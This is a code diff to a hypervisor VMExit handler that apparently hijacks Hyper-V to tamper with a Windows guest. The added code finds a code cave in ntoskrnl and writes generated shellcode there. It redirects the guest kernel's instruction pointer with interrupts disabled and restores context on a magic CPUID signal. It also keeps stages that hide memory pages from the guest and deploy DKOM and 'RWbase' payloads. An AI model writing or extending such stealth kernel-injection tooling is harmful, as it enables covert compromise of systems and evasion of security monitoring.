@@ -6,6 +6,7 @@
 #include "interrupts/interrupts.h"
 #include "loader/loader.h"
 #include "loader/scan.h"
+#include "loader/shellcode.h" // Shellcode generator
 #include "logs/logs.h"
 #include "memory_manager/heap_manager.h"
 #include "memory_manager/memory_manager.h"
@@ -34,12 +35,166 @@ std::uint64_t g_data_end = 0;
 // VMM Shadow Mapper: Guest ntoskrnl base address
 // TODO: Obtain this from PsLoadedModuleList or Guest CR3 scan
 std::uint64_t g_ntoskrnl_base = 0;
+
+// [NEW] Shellcode Injection State
+std::uint64_t g_codecave_pa = 0;
+std::uint64_t g_codecave_va = 0;
+std::uint64_t g_backup_rip = 0;
+std::uint64_t g_backup_rsp = 0;
+std::uint64_t g_backup_rflags = 0;
+trap_frame_t g_backup_context;
 } // namespace
 
 void clean_up_uefi_boot_image() {
   const auto mapped_uefi_boot_base = static_cast<std::uint8_t *>(
       memory_manager::map_host_physical(uefi_boot_physical_base_address));
   crt::set_memory(mapped_uefi_boot_base, 0, uefi_boot_image_size);
+}
+
+// Handles BSP-specific deployment tasks (Scan, Inject, Hide)
+void handle_bsp_deployment(trap_frame_t *trap_frame) {
+  if (apic_t::current_apic_id() != 0)
+    return;
+
+  static uint8_t has_hidden_heap_pages = 0;
+  static uint64_t vmexit_count = 0;
+
+  // Deployment state
+  static uint8_t dkom_deployed = 0;
+  static uint8_t scan_done = 0;
+  static uint8_t injection_done = 0;
+  static uint8_t rwbase_deployed = 0;
+
+  // Thresholds
+  constexpr uint64_t DKOM_THRESHOLD = UINT64_MAX;      // Disabled
+  constexpr uint64_t SCAN_THRESHOLD = 20000;           // Stage 1.5-A: Scan
+  constexpr uint64_t INJECT_THRESHOLD = 20003;         // Stage 1.5-B: Inject
+  constexpr uint64_t HEAP_HIDE_THRESHOLD = UINT64_MAX; // Stage 2: Hide
+
+  ++vmexit_count;
+
+  // Heartbeat
+  if (vmexit_count % 10000 == 0) {
+    logs::print("[Runtime] BSP VMExit Count: 0x%x\n",
+                static_cast<uint32_t>(vmexit_count));
+  }
+
+  // Stage 1.5-A: Scan
+  if (scan_done == 0 && vmexit_count >= SCAN_THRESHOLD) {
+    if (g_ntoskrnl_base != 0) {
+      logs::print("[Runtime] Stage 1.5-A: Scanning for Codecave...\n");
+      const auto result = loader::scan::find_codecave(80, g_ntoskrnl_base);
+      if (result.pa != 0) {
+        g_codecave_pa = result.pa;
+        g_codecave_va = result.va;
+        logs::print("[Runtime] Codecave found. PA:0x%p, VA:0x%p\n",
+                    g_codecave_pa, g_codecave_va);
+      } else {
+        logs::print("[Runtime] Codecave scan failed.\n");
+      }
+      scan_done = 1;
+    }
+  }
+
+  // Stage 1.5-B: Inject & Hijack
+  if (injection_done == 0 && scan_done == 1 && g_codecave_pa != 0 &&
+      vmexit_count >= INJECT_THRESHOLD) {
+
+    const uint8_t cpl = arch::get_guest_cpl();
+    const uint64_t current_rip = arch::get_guest_rip();
+
+    // STRICT FILTER: Kernel Mode (CPL=0) AND Kernel RIP (High Virtual Address)
+    // Windows Kernel Space usually starts at 0xFFFF8... or 0xFFFFF...
+    const bool is_kernel_rip = (current_rip >= 0xFFFFF80000000000);
+
+    if (cpl != 0 || !is_kernel_rip) {
+      // [Debug] Skip User Mode / Invalid Context
+      // User requested to log these attempts.
+      logs::print(
+          "[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d (Not Kernel)\n",
+          current_rip, cpl);
+      return; // Wait for next VMExit
+    }
+
+    // If we are here, we are in Kernel Mode (CPL=0).
+    logs::print("[Runtime] Stage 1.5-B: Injecting Shellcode (Valid Kernel "
+                "Context: RIP=0x%p, CPL=%d)...\n",
+                current_rip, cpl);
+
+    // 1. Resolve ExAllocatePoolWithTag
+    const uint64_t ex_alloc =
+        loader::get_kernel_export(g_ntoskrnl_base, "ExAllocatePoolWithTag");
+
+    if (ex_alloc) {
+      // 2. Generate Shellcode
+      uint8_t code[128];
+      uint32_t code_size = 0;
+      loader::shellcode::generate_pool_allocation(code, code_size, ex_alloc,
+                                                  4096, 0x48797065); // 'Hype'
+
+      // 3. Map Codecave & Write
+      // Use Direct Host Mapping (Identity) to avoid SLAT
+      // complexity/permissions
+      void *mapped_cave = memory_manager::map_host_physical(g_codecave_pa);
+
+      // Calculate size left manually since map_host_physical doesn't return
+      // it
+      uint64_t page_offset = g_codecave_pa & 0xFFF;
+      uint64_t size_left = 0x1000 - page_offset;
+
+      if (mapped_cave && size_left >= code_size) {
+        crt::copy_memory(mapped_cave, code, code_size);
+        logs::print("[Runtime] Shellcode written to PA:0x%p\n", g_codecave_pa);
+
+        // 4. Hijack RIP & Backup Context
+        g_backup_rip = arch::get_guest_rip();
+        g_backup_rsp = arch::get_guest_rsp();       // Explicitly backup RSP
+        g_backup_rflags = arch::get_guest_rflags(); // Save Flags
+        // 4. Hijack RIP & Backup Context
+        g_backup_rip = arch::get_guest_rip();
+        g_backup_rsp = arch::get_guest_rsp();       // Explicitly backup RSP
+        g_backup_rflags = arch::get_guest_rflags(); // Save Flags
+        // Backup full GPR context to restore later (critical for stability)
+        g_backup_context = *trap_frame; // Member-wise copy if POD
+
+        arch::set_guest_rip(g_codecave_va);
+
+        // [SAFETY] Disable Interrupts & Clear Interruptibility State
+        // Ensure shellcode runs atomically without interference from NMI/IRQ
+        arch::set_guest_rflags(g_backup_rflags & ~0x200); // Clear IF (Bit 9)
+        arch::clear_guest_interruptibility();
+
+        logs::print("[Runtime] HIJACKED: RIP 0x%p -> 0x%p (IF Disabled)\n",
+                    g_backup_rip, g_codecave_va);
+        injection_done = 1;
+      } else {
+        logs::print("[Runtime] Failed to map Codecave for writing.\n");
+      }
+    } else {
+      logs::print("[Runtime] Failed to resolve ExAllocatePoolWithTag.\n");
+    }
+    // Set done to avoid retry loop even if failed
+    if (injection_done == 0)
+      injection_done = 1; // Mark failed attempt as done
+  }
+
+  // Stage 2: Heap Hide
+  if (has_hidden_heap_pages == 0 && vmexit_count >= HEAP_HIDE_THRESHOLD) {
+    has_hidden_heap_pages = slat::hide_heap_pages(slat::hyperv_cr3());
+    if (has_hidden_heap_pages) {
+      logs::print("[Runtime] Heap memory hidden.\n");
+
+      // Stage 3: RWbase
+      if (rwbase_deployed == 0 && g_ntoskrnl_base != 0) {
+        logs::print("[Loader] RWbase deployment - START3 phase\n");
+        const auto result = loader::deploy_rwbase_payload(g_ntoskrnl_base);
+        if (result == loader::deploy_result_t::success) {
+          logs::print("[Loader] RWbase deployed with SLAT hiding\n");
+          rwbase_deployed = 1;
+        }
+      }
+    }
+  }
 }
 
 void process_first_vmexit() {
@@ -67,86 +222,6 @@ void process_first_vmexit() {
 
     is_first_vmexit = 0;
   }
-
-  if (apic_t::current_apic_id() == 0) {
-    static uint8_t has_hidden_heap_pages = 0;
-    static uint64_t vmexit_count = 0;
-
-    // VMM Shadow Mapper: Deployment state
-    static uint8_t dkom_deployed = 0;
-    static uint8_t codecave_scanned = 0; // [NEW] Dedicated scan state
-    static uint8_t rwbase_deployed = 0;
-    // [DEBUG] Deployment thresholds configured
-    constexpr uint64_t DKOM_DEPLOY_THRESHOLD =
-        UINT64_MAX; // Stage 1: DKOM (DISABLED)
-    constexpr uint64_t SCAN_THRESHOLD =
-        150000; // Stage 1.5: Codecave Scan (Lowered)
-    constexpr uint64_t HEAP_HIDE_THRESHOLD = UINT64_MAX; // Stage 2: Heap Hide
-
-    ++vmexit_count;
-
-    // [DEBUG] Heartbeat: Verify BSP is counting
-    if (vmexit_count % 50000 == 0) {
-      logs::print("[Runtime] BSP VMExit Count: %llu\n", vmexit_count);
-    }
-
-    // Simplified: ntoskrnl_base is now received only from UEFI/uboot
-    // and is already stored in g_ntoskrnl_base.
-
-    // Stage 1: Deploy DKOM (DISABLED)
-    if (dkom_deployed == 0 && vmexit_count >= DKOM_DEPLOY_THRESHOLD) {
-      if (g_ntoskrnl_base != 0) {
-        const auto result = loader::deploy_dkom_payload(g_ntoskrnl_base);
-        if (result == loader::deploy_result_t::success) {
-          logs::print("[Loader] DKOM deployed successfully\n");
-          dkom_deployed = 1; // Only set on success
-        } else {
-          logs::print("[Loader] DKOM deployment failed: %d (will retry)\n",
-                      static_cast<uint32_t>(result));
-        }
-      }
-    }
-
-    // Stage 1.5: Automated Codecave Scan (BSP Only, Post-Init)
-    if (codecave_scanned == 0 && vmexit_count >= SCAN_THRESHOLD) {
-      if (g_ntoskrnl_base != 0) {
-        logs::print(
-            "[Runtime] Starting automated Codecave scan (Stage 1.5)...\n");
-        // Scan for 100 bytes (example size)
-        const uint64_t cave = loader::scan::find_codecave(100, g_ntoskrnl_base);
-        if (cave) {
-          logs::print("[Runtime] Codecave found at PA: 0x%p\n", cave);
-        } else {
-          logs::print("[Runtime] Codecave scan failed.\n");
-        }
-        codecave_scanned =
-            1; // Mark as done regardless of result to avoid retry loop
-      }
-    }
-
-    // Stage 2: Hide heap pages at 1.5M VMExits (After Scan)
-    if (has_hidden_heap_pages == 0 && vmexit_count >= HEAP_HIDE_THRESHOLD) {
-      has_hidden_heap_pages = slat::hide_heap_pages(slat::hyperv_cr3());
-
-      if (has_hidden_heap_pages == 1) {
-        logs::print("[Runtime] Heap memory hiding complete (Total 1.5M VMExits "
-                    "threshold met).\n");
-
-        // Stage 3: Deploy RWbase after heap hiding (START3 phase)
-        if (rwbase_deployed == 0 && g_ntoskrnl_base != 0) {
-          logs::print("[Loader] RWbase deployment - START3 phase\n");
-          const auto result = loader::deploy_rwbase_payload(g_ntoskrnl_base);
-          if (result == loader::deploy_result_t::success) {
-            logs::print("[Loader] RWbase deployed with SLAT hiding\n");
-            rwbase_deployed = 1; // Only set on success
-          } else {
-            logs::print("[Loader] RWbase deployment failed: %d (will retry)\n",
-                        static_cast<uint32_t>(result));
-          }
-        }
-      }
-    }
-  }
 }
 
 std::uint64_t do_vmexit_premature_return() {
@@ -161,12 +236,33 @@ std::uint64_t vmexit_handler_detour(const std::uint64_t a1,
 
   const std::uint64_t exit_reason = arch::get_vmexit_reason();
 
-  // [DEBUG] Manual Trigger logic removed for stability (Integrated into
-  // automated flow) Codecave scan will now run as part of the BSP deployment
-  // sequence.
+  // Handle Deployment (BSP Only)
+  trap_frame_t *const trap_frame = *reinterpret_cast<trap_frame_t **>(a1);
+  handle_bsp_deployment(trap_frame);
 
   if (arch::is_cpuid(exit_reason) == 1) {
-    trap_frame_t *const trap_frame = *reinterpret_cast<trap_frame_t **>(a1);
+    // [NEW] Shellcode Return Handler (Magic Leaf 0x5000)
+    if (trap_frame->rax == 0x5000 && trap_frame->rcx == 0x1337133713371337) {
+      uint64_t result = trap_frame->rdx; // Result passes in RDX
+      logs::print("[Runtime] SHELLCODE SUCCESS! Allocated Pool: 0x%p\n",
+                  result);
+
+      // Restore Guest Context, RFLAGS & RIP (Absolute Restoration)
+      if (g_backup_rip != 0) {
+        *trap_frame = g_backup_context;          // Restore GPRs
+        arch::set_guest_rflags(g_backup_rflags); // Restore Flags
+        arch::set_guest_rsp(
+            g_backup_rsp); // [FIX] Restore Stack Pointer from global
+        arch::set_guest_rip(g_backup_rip); // Restore Instruction Pointer
+
+        logs::print(
+            "[Runtime] Guest execution restored to 0x%p (Full Context)\n",
+            g_backup_rip);
+      } else {
+        arch::advance_guest_rip(); // Fallback
+      }
+      return do_vmexit_premature_return();
+    }
 
     const hypercall_info_t hypercall_info = {.value = trap_frame->rcx};
 
